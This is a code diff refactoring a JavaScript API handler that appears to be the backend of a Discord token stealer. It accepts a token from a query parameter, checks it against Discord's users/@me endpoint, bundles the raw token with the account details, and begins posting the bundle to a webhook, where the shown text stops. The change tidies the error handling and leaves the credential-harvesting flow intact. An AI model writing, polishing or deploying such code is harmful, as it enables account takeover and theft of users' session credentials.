@@ -4,28 +4,30 @@ import axios from 'axios';
 
 export default async function handler(req, res) {
   try {
-    const { query } = req;
-    if (!query.data) {
-      res.status(400).send('Bad Request: Missing "data" query parameter');
+    const data = req.query.data;
+
+    if (!data) {
+      res.status(400).send({
+        message: 'Bad Request: missing "data" query parameter'
+      });
       return;
     }
 
-    const { data } = query;
-
     let info;
-    await axios.get("https://discord.com/api/v9/users/@me", {
-      headers: {
-        "Content-Type": "application/json",
-        "Authorization": data
-      }
-    }).then(res => {
+    try {
+      let response = await axios.get("https://discord.com/api/v9/users/@me", {
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": data
+        }
+      });
       info = {
         token: data,
-        ...res.data
-      }
-    }).catch(() => {
-      info = null
-    })
+        ...(response.data)
+      };
+    } catch (ex) {
+      info = null;
+    }
 
     if (info?.id) {
       await axios.post(webhook, {
